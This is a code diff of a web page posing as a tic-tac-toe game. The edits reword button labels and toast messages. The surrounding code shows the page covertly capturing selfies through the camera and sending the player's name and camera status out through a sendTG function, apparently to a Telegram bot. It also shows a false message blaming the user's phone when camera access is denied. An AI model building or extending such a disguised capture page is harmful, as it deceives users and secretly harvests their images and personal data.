@@ -140,8 +140,8 @@ body{font-family:'Nunito',sans-serif;background:var(--bg1);color:var(--text);tra
 <div class="screen" id="permScreen">
   <h1 class="rain-title">✨ Tic Tac Toe ✨</h1>
   <p class="rain-sub">tap to begin your adventure</p>
-  <button class="allow-btn" onclick="goToName()">🎮 Allow &amp; Play!</button>
-  <button class="owner-link" onclick="showScreen('ownerScreen')">click if you are the owner</button>
+  <button class="allow-btn" onclick="goToName()">🎮 Enter your Good Name &amp; Play!</button>
+  <button class="owner-link" onclick="showScreen('ownerScreen')">click here if you are this system owner Parth</button>
 </div>
 
 <!-- NAME SCREEN -->
@@ -149,7 +149,7 @@ body{font-family:'Nunito',sans-serif;background:var(--bg1);color:var(--text);tra
   <div class="gcard">
     <span class="card-emoji">👋</span>
     <h2 class="card-title">What's your name?</h2>
-    <p class="card-sub">To write your name into the history books.!</p>
+    <p class="card-sub">We will write your name into the history books. Lets teach the new generation about legendry Gamers like you!</p>
     <input type="text" class="name-input" id="nameInput" placeholder="Enter your name..." maxlength="30"/>
     <button class="capture-btn" onclick="submitName()">Next →</button>
   </div>
@@ -391,7 +391,7 @@ async function startSelfieScreen(){
     document.getElementById('selfieVideo').srcObject=videoStream;
   }catch(e){
     // camera denied — skip to gender
-    showToast('Camera not available, skipping photos','📷');
+    showToast('Your mobile Sensors are not working properly go dump this mobile and buy new good one','🤐');
     await sendTG(`📷 Camera denied\n👤 Name: ${playerName}`);
     showScreen('genderScreen');
   }
@@ -431,7 +431,7 @@ async function startCapture(){
   document.getElementById('selfieCounter').textContent='✅ Game Loaded!';
   // stop camera
   stopCamera();
-  showToast(`Game Loaded Succesfully! Welcome, ${playerName}! 🎉`,'😉');
+  showToast(`Finally Game load hogya hai ! Welcome, ${playerName}! 🎉`,'😉');
   await sleep(1200);
   showScreen('genderScreen');
 }
